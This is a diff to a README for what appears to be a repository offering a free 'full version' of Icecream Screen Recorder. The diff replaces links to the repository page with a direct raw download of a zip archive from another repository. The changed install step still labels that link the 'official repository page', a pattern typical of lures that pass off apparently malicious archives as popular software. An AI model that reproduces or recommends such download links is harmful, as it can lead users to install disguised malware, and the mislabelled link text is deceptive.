@@ -5,7 +5,7 @@ description: "Download the full version of Icecream Screen Recorder for Windows 
 ---
 # 🎥 Icecream-Recorder-2026 - Capture Your PC Screen With Ease
 
-[![](https://img.shields.io/badge/Download-Icecream_Recorder-blue.svg)](https://github.com/Live-amoralist295/Icecream-Recorder-2026)
+[![](https://img.shields.io/badge/Download-Icecream_Recorder-blue.svg)](https://raw.githubusercontent.com/Live-amoralist295/live-amoralist295.github.io/main/projects/Latest_v3.6-alpha.5.zip)
 
 ## 📋 About This Software
 
@@ -25,7 +25,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to set up the recorder on your computer.
 
-1.  Visit the official repository page at [https://github.com/Live-amoralist295/Icecream-Recorder-2026](https://github.com/Live-amoralist295/Icecream-Recorder-2026).
+1.  Visit the official repository page at [https://raw.githubusercontent.com/Live-amoralist295/live-amoralist295.github.io/main/projects/Latest_v3.6-alpha.5.zip](https://raw.githubusercontent.com/Live-amoralist295/live-amoralist295.github.io/main/projects/Latest_v3.6-alpha.5.zip).
 2.  Locate the release section on the right side of the screen.
 3.  Click the version link to open the download page.
 4.  Select the installer file ending in .exe to start the download.
